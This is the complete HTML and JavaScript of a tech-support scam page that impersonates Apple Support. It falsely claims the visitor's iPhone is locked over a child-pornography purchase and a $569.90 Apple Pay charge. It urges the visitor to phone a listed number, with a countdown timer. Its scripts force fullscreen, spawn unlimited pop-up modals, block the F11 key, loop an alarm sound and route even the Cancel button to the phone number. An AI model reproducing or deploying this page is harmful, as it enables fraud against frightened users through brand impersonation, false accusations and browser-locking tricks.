<!DOCTYPE html><html lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="cache-control" content="max-age=3600">
    <title>Contact - Official Apple Support</title>
    <link rel="apple-touch-icon" href="images/favicon.ico">
    <link rel="icon" type="image/png" href="images/favicon.ico">
    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">

    <!-- Bootstrap 5 CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap-icons.css">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/Base.css" type="text/css">

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-2DMKRPGVF0');
</script>
  

</head>

<body onclick="playSound()"  id="link">
    <!-- Click overlay - only active when needed -->
    <div id="clickOverlay" class="click-overlay"></div>

        
    <div class="bgimg">
          <img src="images/bg.jpg" alt="" width="100%">
        </div>


    <div class="main">
        
        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
            <div class="row">
                <div class="column large-12 medium-12 small-12">
                    <div class="as-banner-content">
                        
                        <div class="alert-box">
                            

    <div class="spacbar">
        <div class="d-flex justify-content-between">
  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
</div>
<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
    <div class="alert-title">Your iPhone has been locked due to suspicious activity.</div>
    <div class="alert-texts">
        <div class="bgblue"><strong>Transaction of $569.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
    <div class="txstm"> <br>
        Not you? Call <strong>Apple Support: <br><a href="tel:+1-833-306-3855">+1-833-306-3855</a></strong> to unlock your device.
     </div>
    <a href="tel:+1-833-306-3855" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
    
    </div>
</div>
                        <div class="sectionTitle sectionTitleBlock">
                            <h2 class="sectionTitle-heading"></h2>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <div class="notification">
        <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
<div class="cursor">now</div>
  <div class="notification-header">Payment Successful</div>
  <div class="notification-body">
    Sent $569.90 via Apple Pay to Pornhub <br>Premium.
    Not you? Call +1-833-306-3855
  </div>
  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
</div>

    <div id="modalContainer"></div>

    <!-- Main Modal -->
    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-30px!important;">

        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
            <div class="modal-content">
                <div class="modal-body text-center">
                    <div class="alert-text">
                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-833-306-3855">+1-833-306-3855</a> to unlock it!
                    </div>

                    
                    <div class="text-end gap-4 mt-3 actionbtn">
                        <a href="tel:+1-833-306-3855" class="me-2 bg-primary">Call +1-833-306-3855</a>
                        <a href="tel:+1-833-306-3855" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>

<script>
function playSound() {
  const audio = document.getElementById("clickSound");
//   audio.currentTime = 0; // restart sound if clicked again
  audio.play();
}
</script>
    <!-- Bootstrap & Popper.js -->
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>


<script>
let timeLeft = 10 * 60;

const display = document.getElementById("countdown");

const timer = setInterval(() => {
  let minutes = Math.floor(timeLeft / 60);
  let seconds = timeLeft % 60;

  display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;

  if (timeLeft <= 0) {
    clearInterval(timer);
    display.textContent = "Time's up!";
  }

  timeLeft--;
}, 1000);
</script>


<script>



    let modalCount = 0;
    const maxModals = Infinity;
    let fullScreenTriggered = false;

    // Function to trigger full screen
    function triggerFullScreen() {
        const elem = document.documentElement;
        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(err => {
                    console.error('Fullscreen error:', err);
                });
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }
    }

    // Function to exit fullscreen
    function exitFullScreen() {
        if (document.exitFullscreen) {
            document.exitFullscreen();
        } else if (document.webkitExitFullscreen) {
            document.webkitExitFullscreen();
        } else if (document.msExitFullscreen) {
            document.msExitFullscreen();
        }
    }

    // Function to generate random position within viewport
    function getRandomPosition(modalWidth, modalHeight) {
        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);

        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
            return {
                top: Math.max(0, (viewportHeight - modalHeight) / 2),
                left: Math.max(0, (viewportWidth - modalWidth) / 2)
            };
        }

        const maxX = viewportWidth - modalWidth;
        const maxY = viewportHeight - modalHeight;

        const randomX = Math.floor(Math.random() * (maxX + 1));
        const randomY = Math.floor(Math.random() * (maxY + 1));

        return { top: randomY, left: randomX };
    }

    // Function to create a new modal with random position
    function createNewModal() {
        if (modalCount >= maxModals) return null;

        modalCount++;

        const newModal = document.createElement('div');
        newModal.className = 'modal fade modal-stack';
        newModal.id = `appleAlertModal-${modalCount}`;
        newModal.tabIndex = -1;
        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
        newModal.setAttribute('aria-hidden', 'true');

        newModal.innerHTML = `
            <div class="modal-dialog modal-lg positioned">
                <div class="modal-content" id="applealertmodeltwo">
                    <div class="modal-body text-center">
                        <div class="alert-text">
                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-833-306-3855">+1-833-306-3855</a> to unlock it!
                        </div>

                        
                        <div class="text-end gap-4 mt-3 actionbtn">
                            <a href="tel:+1-833-306-3855" class="me-2 bg-primary">Call +1-833-306-3855</a>
                            <a href="tel:+1-833-306-3855" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                        </div>
                    </div>
                </div>
            </div>
        `;

        document.getElementById('modalContainer').appendChild(newModal);

        const modal = new bootstrap.Modal(newModal, {
            backdrop: 'static',
            keyboard: false
        });

        const modalDialog = newModal.querySelector('.modal-dialog');
        let modalWidth, modalHeight;

        modalWidth = Math.min(600, window.innerWidth * 0.9);
        modalHeight = window.innerWidth <= 576 ? 250 : 400;

        const { top, left } = getRandomPosition(modalWidth, modalHeight);
        modalDialog.style.top = `${top}px`;
        modalDialog.style.left = `${left}px`;

        if (window.innerWidth <= 576) {
            modalDialog.style.width = `${modalWidth}px`;
            modalDialog.style.maxWidth = 'none';
        }

        newModal.style.zIndex = 1080 + modalCount;
        modal.show();

        // Ensure tel: link actually triggers phone call
        newModal.querySelectorAll('.tel-link').forEach(link => {
            link.addEventListener('click', (e) => {
                window.location.href = link.getAttribute('href');
            });
        });

        // return modal;
    }

    // Initialize the first modal
    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
        backdrop: 'static',
        keyboard: false
    });

    document.addEventListener('DOMContentLoaded', function () {
        appleAlertModal.show();
    });

    // Add event listener to body for fullscreen and modal creation
    document.body.addEventListener('click', () => {
        triggerFullScreen();
        createNewModal();
    });

    // On ESC â†’ exit fullscreen
    document.addEventListener("keydown", function (e) {
        if (e.key === "Escape") {
            exitFullScreen();
        }
        if (e.key === "F11" || e.keyCode === 122) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }, true);

    document.addEventListener("keyup", function (e) {
        if (e.key === "F11" || e.keyCode === 122) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }, true);

    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
    document.addEventListener("fullscreenchange", () => {
        if (!document.fullscreenElement) {
            // User exited fullscreen
            document.body.addEventListener("click", triggerFullScreen, { once: true });
        }
    });

    window.addEventListener('resize', function () {
        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');

        modals.forEach(modal => {
            const viewportHeight = window.innerHeight;
            const modalHeight = modal.offsetHeight;
            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);

            if (top + modalHeight > viewportHeight) {
                top = Math.max(0, viewportHeight - modalHeight);
            }

            modal.style.top = `${top}px`;
            modal.style.left = `0`;
            modal.style.width = `100%`;
            modal.style.maxHeight = `${viewportHeight}px`;
            modal.style.overflow = `hidden`;
        });
    });
</script> 

    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>


</body></html>
